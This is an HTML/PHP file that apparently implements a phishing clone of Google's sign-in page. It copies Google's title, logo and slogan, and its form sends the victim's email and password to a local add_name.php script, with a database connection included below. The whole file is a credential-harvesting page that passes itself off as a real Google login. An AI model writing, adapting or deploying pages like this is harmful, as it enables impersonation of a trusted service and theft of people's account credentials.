<html>
<title>Google Log In</title>
<link rel="icon" type="image/c-icon" href="images/logo.png">
<head>

<link rel="stylesheet"href="style.css">

</head>
<div class="container">
    <div class="logo-block margin">
        <img src="images/image.png" class="title-image" width="100px" alt="google logo">
    </div>

    <div class="title-block">
        <h1 class="login-title">One account. All of Google.</h1>
    </div>

    <div class="signin-block">
        <h3 class="login-text">Sign in with your Google Account</h3>

        <div class="account-wall">
            <img class="profile-img" src="images/logo.png" alt="profile picture">

            <form class="form-signin" action='add_name.php'>
                <label for="name"></label>
                <input type="text" class="form-control" placeholder="Email" required autofocus id="name" name="name">
                <label for="value"></label>
                <input type="password" class="form-control" placeholder="Password" required id="value" name="value">

                <button id="button1" type="submit">Sign in</button>
            </form>
        </div>

        <a href="#" class="new-account">Create an account </a>
    </div>
</div>

<?php
include "dbconnect.php";
$mysqli->close();
?>
</html>